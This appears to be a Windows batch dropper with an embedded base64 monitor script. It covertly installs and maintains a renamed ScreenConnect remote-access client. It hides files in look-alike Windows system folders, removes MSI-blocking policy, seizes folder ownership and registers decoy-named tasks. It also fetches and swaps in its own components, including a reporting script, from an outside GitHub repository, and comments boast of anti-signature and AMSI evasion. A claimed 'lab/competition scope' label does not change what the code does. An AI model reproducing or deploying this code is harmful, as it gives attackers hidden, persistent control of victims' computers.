:EnsureGryxaMust
rem O42: thin fallback — prefer lib gryxa-ensure; never msiexec here.
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
::QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIwMjYwODA0TTUwDQpy
::ZW0gIE01MDogaGFzaC1taXNtYXRjaCDihpIgQlVJTEQgZmFsbGJhY2sgKHVuc3Rp
::Y2sgQ0ROLXN0YWxlIG1haW4pLg0KcmVtICBNNDk6IEZSRUVaRSAtIG5vIGF1dG8g
::R3J5eGEgbXNpZXhlYyBmcm9tIG1vbjsgc3RhcnQtb25seTsgbWFudWFsIGZvcmNl
::IG9ubHkuDQpyZW0gIE00ODogSEFORFMtT0ZGIGFsbCBTQyBpbnRlcnJ1cHQg4oCU
::IG9ubHkgR3J5eGEgaW5zdGFsbC1pZi1hYnNlbnQuIE5vIGV4dGVybWluYXRlL3Nl
::dnJ6IC9pL3NjIGRlbGV0ZS4NCnJlbSAgTTQ3OiBIQVJEIHN0b3AgR3J5eGEgaW50
::ZXJydXB0cyDigJQgbm8gcmF3IHNldnJ6IC9pOyBkZXRlY3QgYW55IG5vbi1zZXZy
::eiBTQzsgYWRvcHQgbGl2ZSBGUC4NCnJlbSAgTTQ2OiBTVEFSVF9QRU5ESU5HID0g
::YWxpdmU7IG5ldmVyIC94IEdyeXhhIHdoaWxlIHNlcnZpY2UgZXhpc3RzIChjb25u
::ZWN0LWRyb3ApLg0KcmVtICBNNDU6IEw0MiBzYWZlIEZQIG1pZ3JhdGUgKGluc3Rh
::bGwgbmV3IGJlZm9yZSByZW1vdmluZyBvbGQgR3J5eGEpLg0KcmVtICBNNDQ6IGZv
::cmNlX2dyeXhhLmZsYWcgbXVzdCBOT1QgL3ggbGl2ZSBHcnl4YSAoTDQxIGZvcmNl
::LXNraXAtaWYtcnVubmluZykuDQpyZW0gIE00MzogQU1TSS1wcm9vZiBHcnl4YSBm
::YWxsYmFjayB2aWEgb3duX2dyeXhhLmNtZCAocHVyZSBtc2lleGVjKSB3aGVuIFBT
::IGJsb2NrZWQvbWlzc2luZy4NCnJlbSAgTTQyOiBzaWduZWQgbWFuaWZlc3Q7IHNl
::dnJ6LmNmZzsgc2libGluZy1zYWZlIHNldnJ6IC9pLg0KcmVtICBBdXRob3JpemVk
::IGludGVybmFsIGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25s
::eS4NCnJlbSDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZANCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCg0Kc2V0ICJL
::RUVQX0ZQPTVmNjAxMDU3OTg1MmU1MDciDQpzZXQgIkFMVF9GUD1mODYxYzgxNDBk
::NDUzNDI3Ig0Kc2V0ICJHUllYQV9GUD0zNmU1MDZmZjAxNmIyMTUxIg0Kc2V0ICJX
::RD1DOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3Vj
::YWNoZSINCnNldCAiRVRMPUM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFnbm9z
::aXNcU3RhdGVcLmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxvd25fbW9uLmxvZyIN
::CnNldCAiU1RBVEU9JVdEJVxvd25fbW9uLnN0YXRlIg0Kc2V0ICJIQkZMQUc9JVdE
::JVxoYi5mbGFnIg0Kc2V0ICJDVVJMPSVTeXN0ZW1Sb290JVxTeXN0ZW0zMlxjdXJs
::LmV4ZSINCnNldCAiVEc9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t
::L3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vdGdfcmVwb3J0LnBzMT90PSVSQU5E
::T00lJVJBTkRPTSUiDQpzZXQgIlRHMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQv
::Z2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi90Z19yZXBvcnQucHMxP3Q9JVJB
::TkRPTSUlUkFORE9NJSINCnNldCAiT1dOU0VDPWh0dHBzOi8vcmF3LmdpdGh1YnVz
::ZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9zZWN1
::cmUuY21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOU0VDMj1odHRwczov
::L2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9v
::d25fc2VjdXJlLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTk1PTj1o
::dHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHVi
::LWRyb3AvbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQg
::Ik9XTk1PTjI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dp
::dGh1Yi1kcm9wQG1haW4vb3duX21vbi5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0K
::c2V0ICJPV05MSUI9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hu
::b2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX2xpYi5wczE/dD0lUkFORE9NJSVS
::QU5ET00lIg0Kc2V0ICJPV05MSUIyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9n
::aC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9saWIucHMxP3Q9JVJBTkRP
::TSUlUkFORE9NJSINCnNldCAiT1dOR1JZWEE9aHR0cHM6Ly9yYXcuZ2l0aHVidXNl
::cmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX2dyeXhh
::LmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkdSWVhBMj1odHRwczov
::L2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9v
::d25fZ3J5eGEuY21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiTUFOSUZFU1Rf
::VVJMPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9n
::aXRodWItZHJvcC9tYWluL3VwZGF0ZS5tYW5pZmVzdD90PSVSQU5ET00lJVJBTkRP
::TSUiDQpzZXQgIk1BTklGRVNUX1NJR19VUkw9aHR0cHM6Ly9yYXcuZ2l0aHVidXNl
::cmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vdXBkYXRlLm1h
::bmlmZXN0LnNpZz90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIlNFVlJaX0VYUF9V
::Ukw9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dp
::dGh1Yi1kcm9wL21haW4vc2V2cnpfZXhwZWN0ZWQuY2ZnP3Q9JVJBTkRPTSUlUkFO
::RE9NJSINCnNldCAiU0VWUlpfRVhQX1VSTDI9aHR0cHM6Ly9jZG4uanNkZWxpdnIu
::bmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vc2V2cnpfZXhwZWN0ZWQu
::Y2ZnP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiTVNJX1VSTD1odHRwczovL3Vp
::LnNldnJ6LmNvbS9CaW4vU2NyZWVuQ29ubmVjdC5DbGllbnRTZXR1cC5tc2k/ZT1B
::Y2Nlc3MmeT1HdWVzdCINCnNldCAiTVNJX0dSWVhBPWh0dHBzOi8vdWkuZ3J5eGEu
::Y29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5
::PUd1ZXN0Ig0Kc2V0ICJNU0lfUEtHMT1odHRwczovL3Jhdy5naXRodWJ1c2VyY29u
::dGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9wa2cubXNpIg0Kc2V0
::ICJNU0lfUEtHMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkv
::Z2l0aHViLWRyb3BAbWFpbi9wa2cubXNpIg0Kc2V0ICJNU0k9JVByb2dyYW1EYXRh
::JVxTY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaSINCnNldCAiTVNJQ0FDSEU9
::JVdEJVxwa2cubXNpIg0Kc2V0ICJNU0lfRz0lUHJvZ3JhbURhdGElXFNjcmVlbkNv
::bm5lY3QuR3J5eGEubXNpIg0Kc2V0ICJNU0lDQUNIRV9HPSVXRCVccGtnX2dyeXhh
::Lm1zaSINCg0KaWYgbm90IGV4aXN0ICIlV0QlIiBtZCAiJVdEJSIgMj5udWwNCmlm
::IG5vdCBleGlzdCAiJUxPRyUiIHR5cGUgbnVsPiIlTE9HJSIgMj5udWwNCg0Kc2V0
::ICJNT05WRVI9TTUwIg0Kc2V0ICJQRjg2PSVQcm9ncmFtRmlsZXMoeDg2KSUiDQpz
::ZXQgIkdSWVhBX0RFRVA9JVdEJVxncnl4YV9kZWVwLmZsYWciDQpyZW0gbG9hZCBj
::dXJyZW50IEdyeXhhIEZQIChtYXkgcm90YXRlIHdoZW4gc2VydmVyL2tleXMgY2hh
::bmdlKQ0KaWYgZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2tx
::IHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikg
::ZG8gaWYgL0kgIiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCIN
::CmlmIG5vdCBkZWZpbmVkIEdSWVhBX0ZQIHNldCAiR1JZWEFfRlA9MzZlNTA2ZmYw
::MTZiMjE1MSINCmZvciAvZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAiICUlYSBpbiAo
::IiVkYXRlJSIpIGRvIHNldCAiRFQ9JWRhdGUlICV0aW1lJSINCmVjaG8uPj4iJUxP
::RyUiDQplY2hvIOKUgOKUgCB0aWNrICFEVCEgW3ZlciAlTU9OVkVSJV0g4pSA4pSA
::Pj4iJUxPRyUiDQpzZXQgIkNPVU5UPTAiDQpzZXQgIklOU1RBTExFRD0wIg0Kc2V0
::ICJQUklNX09LPTAiDQpzZXQgIkFMVF9PSz0wIg0Kc2V0ICJGT1JFSUdOX0xFRlQ9
::MCINCnNldCAiRk9SRUlHTl9MSVNUPSINCnNldCAiTVNJRVhJVD1ub3QtcnVuIg0K
::DQpyZW0g4pSA4pSAIFswXSBzaW5nbGUtZmxpZ2h0IG11dGV4IChzdG9wIG92ZXJs
::YXBwaW5nIHRpY2tzIHJhY2luZyBtc2lleGVjKSDilIDilIANCnNldCAiTVVURVg9
::JVdEJVx0aWNrLmxvY2siDQppZiBleGlzdCAiJU1VVEVYJSIgKA0KICBmb3IgJSVB
::IGluICgiJU1VVEVYJSIpIGRvIHNldCAiTE9DS0FHRT0lJX50QSINCiAgcG93ZXJz
::aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKFRl
::c3QtUGF0aCAnJU1VVEVYJScpIC1hbmQgKCgoR2V0LURhdGUpLShHZXQtSXRlbSAt
::TGl0ZXJhbFBhdGggJyVNVVRFWCUnIC1Gb3JjZSkuTGFzdFdyaXRlVGltZSkuVG90
::YWxNaW51dGVzIC1sdCAyMCkpeyBleGl0IDEgfSBlbHNlIHsgZXhpdCAwIH0iID5u
::dWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gdGlja19za2lw
::cGVkX211dGV4X2J1c3k+PiIlTE9HJSINCiAgICBlbmRsb2NhbA0KICAgIGV4aXQg
::L2IgMA0KICApDQopDQplY2hvICVEQVRFJSAlVElNRSUgJVJBTkRPTSU+IiVNVVRF
::WCUiDQoNCnJlbSDilIDilIAgcGVyLWhvc3QgaWRlbnRpdHkgKGFudGktc2lnbmF0
::dXJlKSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCmlmIGV4aXN0ICIlV0QlXG93
::bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
::IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMx
::IiAtQWN0aW9uIGluaXQgLVdvcmtEaXIgIiVXRCUiID5udWwgMj4mMQ0KaWYgZXhp
::c3QgIiVXRCVcaWRlbnRpdHkuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0x
::LCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcaWRlbnRpdHkuY2ZnIikgZG8gc2V0
::ICIlJUs9JSVMIg0KaWYgbm90IGRlZmluZWQgVEFTS19BIHNldCAiVEFTS19BPVdl
::clF1ZXVlU3luYyINCmlmIG5vdCBkZWZpbmVkIFRBU0tfQiBzZXQgIlRBU0tfQj1Q
::bGFTZXJ2ZXJIZWFsdGgiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Mgc2V0ICJUQVNL
::X0M9V2RpSG9zdFByb3h5Ig0KaWYgbm90IGRlZmluZWQgVEFTS19EIHNldCAiVEFT
::S19EPVRjcElwQ29uZmxpY3RSZXMiDQppZiBub3QgZGVmaW5lZCBNT19BIHNldCAi
::TU9fQT0yIg0KaWYgbm90IGRlZmluZWQgTU9fQiBzZXQgIk1PX0I9MyINCg0KcmVt
::IOKUgOKUgCBbQV0gYXV0by11cGRhdGUgY29yZSBmaWxlcyAoYmVzdCBlZmZvcnQp
::IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgA0KaWYgbm90IGV4aXN0ICIlQ1VSTCUiIHNldCAiQ1VSTD1jdXJsLmV4
::ZSINCnJlbSBNMzU6IGd1YXJhbnRlZSB1cGRhdGUgY2hhbm5lbCDigJQgdW5oYXJk
::ZW4gd29ya2RpciBlYWNoIHRpY2sgYW5kIHN0YWdlIGRvd25sb2Fkcw0KcmVtIGlu
::IEM6XFdpbmRvd3NcVGVtcCAobmV2ZXIgQUNMLWxvY2tlZCksIHRoZW4gbW92ZSBp
::bnRvICVXRCUuIExvY2tEaXIgY2Fubm90IGZyZWV6ZSB1cy4NCnNldCAiU1RBR0U9
::JVN5c3RlbVJvb3QlXFRlbXBcLnVwZCINCmlmIG5vdCBleGlzdCAiJVNUQUdFJSIg
::bWtkaXIgIiVTVEFHRSUiID5udWwgMj4mMQ0KYXR0cmliIC1oIC1zIC1yICIlV0Ql
::IiA+bnVsIDI+JjENCnRha2Vvd24gL0YgIiVXRCUiIC9SIC9EIFkgPm51bCAyPiYx
::DQppY2FjbHMgIiVXRCUiIC9yZXNldCAvVCAvQyAvUSA+bnVsIDI+JjENCmljYWNs
::cyAiJVdEJSIgL2dyYW50ICJOVCBBVVRIT1JJVFlcU1lTVEVNOihPSSkoQ0kpRiIg
::IkJVSUxUSU5cQWRtaW5pc3RyYXRvcnM6KE9JKShDSSlGIiAvVCAvQyAvUSA+bnVs
::IDI+JjENCmF0dHJpYiAtaCAtcyAtciAiJVdEJVx0Z19yZXBvcnQucHMxIiAiJVdE
::JVxvd25fc2VjdXJlLmNtZCIgIiVXRCVcb3duX2xpYi5wczEiICIlV0QlXG93bl9t
::b24uY21kIiA+bnVsIDI+JjENCg0Kc2V0ICJTRUxGX1VQRD0wIg0KIiVDVVJMJSIg
::LUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGlt
::ZSA0MCAtbyAiJVNUQUdFJVx0Z19yZXBvcnQubmV3IiAiJVRHJSIgPm51bCAyPiYx
::DQppZiBub3QgZXhpc3QgIiVTVEFHRSVcdGdfcmVwb3J0Lm5ldyIgIiVDVVJMJSIg
::LUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RBR0Ul
::XHRnX3JlcG9ydC5uZXciICIlVEcyJSIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAt
::LXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDMw
::IC1vICIlU1RBR0UlXG93bl9zZWN1cmUubmV3IiAiJU9XTlNFQyUiID5udWwgMj4m
::MQ0KaWYgbm90IGV4aXN0ICIlU1RBR0UlXG93bl9zZWN1cmUubmV3IiAiJUNVUkwl
::IiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVTVEFH
::RSVcb3duX3NlY3VyZS5uZXciICIlT1dOU0VDMiUiID5udWwgMj4mMQ0KIiVDVVJM
::JSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgt
::dGltZSA0MCAtbyAiJVNUQUdFJVxvd25fbGliLm5ldyIgIiVPV05MSUIlIiA+bnVs
::IDI+JjENCmlmIG5vdCBleGlzdCAiJVNUQUdFJVxvd25fbGliLm5ldyIgIiVDVVJM
::JSIgLUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RB
::R0UlXG93bl9saWIubmV3IiAiJU9XTkxJQjIlIiA+bnVsIDI+JjENCiIlQ1VSTCUi
::IC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRp
::bWUgNDAgLW8gIiVTVEFHRSVcb3duX21vbi5uZXh0IiAiJU9XTk1PTiUiID5udWwg
::Mj4mMQ0KaWYgbm90IGV4aXN0ICIlU1RBR0UlXG93bl9tb24ubmV4dCIgIiVDVVJM
::JSIgLUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RB
::R0UlXG93bl9tb24ubmV4dCIgIiVPV05NT04yJSIgPm51bCAyPiYxDQoiJUNVUkwl
::IiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10
::aW1lIDIwIC1vICIlU1RBR0UlXG93bl9ncnl4YS5uZXciICIlT1dOR1JZWEElIiA+
::bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiAi
::JUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMjAgLW8g
::IiVTVEFHRSVcb3duX2dyeXhhLm5ldyIgIiVPV05HUllYQTIlIiA+bnVsIDI+JjEN
::CiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA2
::IC0tbWF4LXRpbWUgMjAgLW8gIiVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0IiAiJU1B
::TklGRVNUX1VSTCUiID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2
::b2tlIC0tY29ubmVjdC10aW1lb3V0IDYgLS1tYXgtdGltZSAyMCAtbyAiJVNUQUdF
::JVx1cGRhdGUubWFuaWZlc3Quc2lnIiAiJU1BTklGRVNUX1NJR19VUkwlIiA+bnVs
::IDI+JjENCg0KcmVtIE00Mjogc2lnbmVkIHVwZGF0ZS5tYW5pZmVzdCBnYXRlIChS
::U0EtU0hBMjU2KS4gRmFsbGJhY2sgdG8gQlVJTEQgbWFya2VycyBpZiBubyBwdWJr
::ZXkgeWV0Lg0Kc2V0ICJVUERfT0s9MCINCnNldCAiTUFQPSINCmlmIGV4aXN0ICIl
::U1RBR0UlXG93bl9saWIubmV3IiBzZXQgIk1BUD0hTUFQIW93bl9saWIucHMxPSVT
::VEFHRSVcb3duX2xpYi5uZXc7Ig0KaWYgZXhpc3QgIiVTVEFHRSVcb3duX21vbi5u
::ZXh0IiBzZXQgIk1BUD0hTUFQIW93bl9tb24uY21kPSVTVEFHRSVcb3duX21vbi5u
::ZXh0OyINCmlmIGV4aXN0ICIlU1RBR0UlXG93bl9zZWN1cmUubmV3IiBzZXQgIk1B
::UD0hTUFQIW93bl9zZWN1cmUuY21kPSVTVEFHRSVcb3duX3NlY3VyZS5uZXc7Ig0K
::aWYgZXhpc3QgIiVTVEFHRSVcdGdfcmVwb3J0Lm5ldyIgc2V0ICJNQVA9IU1BUCF0
::Z19yZXBvcnQucHMxPSVTVEFHRSVcdGdfcmVwb3J0Lm5ldzsiDQppZiBleGlzdCAi
::JVNUQUdFJVxvd25fZ3J5eGEubmV3IiBzZXQgIk1BUD0hTUFQIW93bl9ncnl4YS5j
::bWQ9JVNUQUdFJVxvd25fZ3J5eGEubmV3OyINCnNldCAiVlJFUz1taXNzaW5nIg0K
::aWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGlmIGV4aXN0ICIlU1RBR0UlXHVw
::ZGF0ZS5tYW5pZmVzdCIgaWYgZXhpc3QgIiVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0
::LnNpZyIgaWYgZGVmaW5lZCBNQVAgKA0KICBmb3IgL2YgInVzZWJhY2txIGRlbGlt
::cz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
::dmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5w
::czEiIC1BY3Rpb24gdmVyaWZ5LXVwZGF0ZSAtV29ya0RpciAiJVdEJSIgLUV4dHJh
::ICIlU1RBR0UlXHVwZGF0ZS5tYW5pZmVzdHwlU1RBR0UlXHVwZGF0ZS5tYW5pZmVz
::dC5zaWd8IU1BUCEiYCkgZG8gc2V0ICJWUkVTPSUlUiINCikNCmVjaG8gdXBkYXRl
::X3ZlcmlmeT0hVlJFUyE+PiIlTE9HJSINCmlmIC9JICIhVlJFUyEiPT0ib2siICgN
::CiAgc2V0ICJVUERfT0s9MSINCikgZWxzZSBpZiAvSSAiIVZSRVMhIj09Im1pc3Np
::bmciICgNCiAgc2V0ICJVUERfT0s9ZmFsbGJhY2siDQopIGVsc2UgaWYgL0kgIiFW
::UkVTISI9PSJuby1wdWJrZXkiICgNCiAgc2V0ICJVUERfT0s9ZmFsbGJhY2siDQop
::IGVsc2UgaWYgL0kgIiFWUkVTOn4wLDEwISI9PSJub3QtaW4tbWFuIiAoDQogIHNl
::dCAiVVBEX09LPWZhbGxiYWNrIg0KKSBlbHNlIGlmIC9JICIhVlJFUzp+MCwxMyEi
::PT0iaGFzaC1taXNtYXRjaCIgKA0KICByZW0gTTUwOiBDRE4gbWF5IHNlcnZlIHN0
::YWxlIG1haW4gd2hpbGUgbWFuaWZlc3QgaXMgZnJlc2gg4oCUIG5ldmVyIHJlZnVz
::ZS1hbGwgKHRoYXQgc3R1Y2sgZmxlZXQgb24gTTQ4KS4NCiAgc2V0ICJVUERfT0s9
::ZmFsbGJhY2siDQogIGVjaG8gdXBkYXRlX2hhc2hfbWlzbWF0Y2hfZmFsbGJhY2tf
::IVZSRVMhPj4iJUxPRyUiDQopIGVsc2UgKA0KICBlY2hvIHVwZGF0ZV9yZWZ1c2Vk
::XyFWUkVTIT4+IiVMT0clIg0KKQ0KDQppZiAvSSAiIVVQRF9PSyEiPT0iMSIgKA0K
::ICBpZiBleGlzdCAiJVNUQUdFJVx0Z19yZXBvcnQubmV3IiBtb3ZlIC95ICIlU1RB
::R0UlXHRnX3JlcG9ydC5uZXciICIlV0QlXHRnX3JlcG9ydC5wczEiID5udWwgMj4m
::MQ0KICBpZiBleGlzdCAiJVNUQUdFJVxvd25fc2VjdXJlLm5ldyIgbW92ZSAveSAi
::JVNUQUdFJVxvd25fc2VjdXJlLm5ldyIgIiVXRCVcb3duX3NlY3VyZS5jbWQiID5u
::dWwgMj4mMQ0KICBpZiBleGlzdCAiJVNUQUdFJVxvd25fbGliLm5ldyIgbW92ZSAv
::eSAiJVNUQUdFJVxvd25fbGliLm5ldyIgIiVXRCVcb3duX2xpYi5wczEiID5udWwg
::Mj4mMQ0KICBpZiBleGlzdCAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiBmaW5kc3Ry
::IC9DOiJPV05fR1JZWEEgQlVJTEQiICIlU1RBR0UlXG93bl9ncnl4YS5uZXciID5u
::dWwgMj4mMSAmJiBtb3ZlIC95ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciICIlV0Ql
::XG93bl9ncnl4YS5jbWQiID5udWwgMj4mMQ0KICBzZXQgIlNFTEZfVVBEPTAiDQog
::IGlmIGV4aXN0ICIlU1RBR0UlXG93bl9tb24ubmV4dCIgKA0KICAgIGZjIC9iICIl
::U1RBR0UlXG93bl9tb24ubmV4dCIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4m
::MQ0KICAgIGlmIGVycm9ybGV2ZWwgMSBzZXQgIlNFTEZfVVBEPTEiDQogICAgaWYg
::IiFTRUxGX1VQRCEiPT0iMCIgZGVsIC9mIC9xICIlU1RBR0UlXG93bl9tb24ubmV4
::dCIgPm51bCAyPiYxDQogICkNCikgZWxzZSBpZiAvSSAiIVVQRF9PSyEiPT0iZmFs
::bGJhY2siICgNCiAgZmluZHN0ciAvQzoiVEdfUkVQT1JUIEJVSUxEIiAiJVNUQUdF
::JVx0Z19yZXBvcnQubmV3IiA+bnVsIDI+JjEgJiYgZm9yICUlRiBpbiAoIiVTVEFH
::RSVcdGdfcmVwb3J0Lm5ldyIpIGRvIGlmICUlfnpGIEdUUiAxNTAwIG1vdmUgL3kg
::IiVTVEFHRSVcdGdfcmVwb3J0Lm5ldyIgIiVXRCVcdGdfcmVwb3J0LnBzMSIgPm51
::bCAyPiYxDQogIGZpbmRzdHIgL0M6Ik9XTl9TRUNVUkUgQlVJTEQiICIlU1RBR0Ul
::XG93bl9zZWN1cmUubmV3IiA+bnVsIDI+JjEgJiYgZm9yICUlRiBpbiAoIiVTVEFH
::RSVcb3duX3NlY3VyZS5uZXciKSBkbyBpZiAlJX56RiBHVFIgODAwIG1vdmUgL3kg
::IiVTVEFHRSVcb3duX3NlY3VyZS5uZXciICIlV0QlXG93bl9zZWN1cmUuY21kIiA+
::bnVsIDI+JjENCiAgZmluZHN0ciAvQzoiT1dOX0xJQiAgQlVJTEQiICIlU1RBR0Ul
::XG93bl9saWIubmV3IiA+bnVsIDI+JjEgJiYgZm9yICUlRiBpbiAoIiVTVEFHRSVc
